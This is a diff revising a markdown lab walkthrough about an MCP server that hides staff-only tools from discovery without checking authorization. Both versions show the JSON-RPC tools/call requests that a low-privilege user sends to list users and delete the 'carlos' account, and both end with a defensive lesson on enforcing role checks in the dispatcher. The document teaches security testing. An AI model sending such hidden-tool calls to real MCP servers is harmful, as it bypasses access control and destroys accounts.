@@ -6,70 +6,45 @@ permalink: /labs/mcp-server-hides-tools/
 
 # MCP Server Hides Tools Without Restricting Them
 
-## Lab
+## Goal
 
-**Name:** MCP server hides tools without restricting them
-**Goal:** Delete the `carlos` account using a hidden MCP tool.
+Use the lab's staff-only MCP tools to delete the `carlos` account while authenticated as `wiener`.
 
-## Authentication
+## Walkthrough
 
-Log in as `wiener`, retrieve the API key from `/my-account`, and use it as the bearer token.
+1. Sign in as `wiener`, open `/my-account`, and copy the displayed API key.
+2. Initialize `/mcp` with the API key as a bearer token. In Burp Repeater, send `tools/list` and note which tools are advertised.
+3. Read the server instructions returned by initialization. They mention `list_users` and `delete_user` as staff tools, even though neither appears in `tools/list`. This is the clue that discovery is hiding the tools rather than the server necessarily enforcing authorization.
+4. Try the named `list_users` tool directly using the normal JSON-RPC `tools/call` method:
 
-Initialize the MCP server and inspect `tools/list`.
+   ```json
+   {
+     "jsonrpc":"2.0",
+     "id":3,
+     "method":"tools/call",
+     "params":{"name":"list_users","arguments":{}}
+   }
+   ```
 
-## Find the Hidden Tool
+   A successful result returns the user list. If the server rejects the request, confirm that you reused the initialized session and the `wiener` API key.
 
-The server instructions reveal that staff accounts can use:
+5. Call the hidden `delete_user` tool for the lab's target user:
 
-- `list_users`
-- `delete_user`
+   ```json
+   {
+     "jsonrpc":"2.0",
+     "id":4,
+     "method":"tools/call",
+     "params":{"name":"delete_user","arguments":{"username":"carlos"}}
+   }
+   ```
 
-However, `tools/list` does not advertise these tools.
+6. The result `Deleted carlos` confirms the operation and completes the lab.
 
-The MCP protocol still allows clients to call them directly by name.
+## Why it works
 
-## Exploit
+`tools/list` controls what a client discovers, not what the server is willing to execute. The dispatcher accepts a tool name without independently checking the caller's role.
 
-List the hidden staff accounts:
+## Defensive lesson
 
-```json
-{
-  "jsonrpc":"2.0",
-  "id":3,
-  "method":"tools/call",
-  "params": {
-    "name": "list_users",
-    "arguments": {}
-  }
-}
-```
-
-Delete `carlos`:
-
-```json
-{
-  "jsonrpc":"2.0",
-  "id":4,
-  "method":"tools/call",
-  "params": {
-    "name": "delete_user",
-    "arguments": {
-      "username": "carlos"
-    }
-  }
-}
-```
-
-The response confirms:
-
-```text
-Deleted carlos
-```
-
-## Why It Works
-
-Removing a tool from `tools/list` is only UI-level filtering. It does not prevent an MCP client from sending a `tools/call` request for that tool.
-
-## Key Takeaway
-
-Authorization must exist in the MCP server's tool dispatcher. Every tool call, including calls to hidden tools, must verify the caller's role and permissions.
+Enforce authorization inside each tool handler or in a shared dispatcher. Never treat omission from discovery as an access-control check.
